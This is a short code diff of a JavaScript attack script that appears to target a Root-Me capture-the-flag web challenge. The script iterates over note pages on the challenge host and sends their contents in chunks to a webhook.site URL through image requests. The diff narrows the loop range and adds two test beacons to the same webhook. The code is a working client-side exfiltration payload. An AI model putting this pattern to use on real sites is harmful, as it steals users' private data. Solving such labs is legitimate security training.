@@ -2,7 +2,7 @@
 const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056/notes/";
 const WEBHOOK = "https://webhook.site/04ff6bdb-7cda-4c12-b9a3-be41cf998864";
 
-async function run(a = 1000, b = 1100) {
+async function run(a = 1000, b = 1001) {
     const promises = [];
 
     for (let i = a; i < b; i++) {
@@ -28,7 +28,10 @@ async function run(a = 1000, b = 1100) {
         new Image().src = WEBHOOK + "?part=" + i + "&data=" + encodeURIComponent(chunk);
     }
 
+    new Image().src = WEBHOOK + "?test=yes";
+
     console.log("img executed after all iframes loaded");
+    new Image().src = WEBHOOK + "?test=no";
 }
 
 run();
